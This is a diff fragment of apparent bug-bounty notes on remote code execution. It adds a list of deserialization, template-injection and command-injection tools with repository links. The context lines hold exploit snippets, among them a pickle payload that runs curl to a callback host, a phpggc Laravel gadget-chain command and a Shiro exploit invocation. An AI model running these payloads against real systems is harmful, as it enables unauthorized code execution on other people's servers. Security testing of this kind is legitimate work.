@@ -15,3 +15,22 @@ payload = base64.b64encode(pickle.dumps(Exploit()))
 php phpggc Laravel/RCE5 system 'id > /tmp/rce-proof' | base64
 python3 shiro_exploit.py -u https://target.com/ \
 return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
+# ─── RCE tool references (page 23 of bounty_tips_100) ───
+# PHP object injection / gadget chains
+phpggc              # https://github.com/ambionics/phpggc
+php-object-injection-check  # https://github.com/portswigger/php-object-injection-check
+# Java deserialization
+ysoserial           # https://github.com/frohoff/ysoserial
+gadgetprobe         # https://github.com/portswigger/gadgetprobe
+Java-Deserialization-Scanner # https://github.com/federicodotta/Java-Deserialization-Scanner
+J2EEScan            # https://github.com/ilmila/J2EEScan
+jexboss             # https://github.com/joaomatosf/jexboss
+# .NET deserialization
+Freddy              # https://github.com/nccgroup/freddy
+# Templates
+tplmap              # https://github.com/epinna/tplmap.git
+# Command injection payload archive
+command-injection-payload-list  # https://github.com/payloadbox/command-injection-payload-List
+shelling            # https://github.com/ewilded/shelling
+# File-upload-to-RCE Burp scanner
+mod0BurpUploadScanner # https://github.com/modzero/mod0BurpUploadScanner
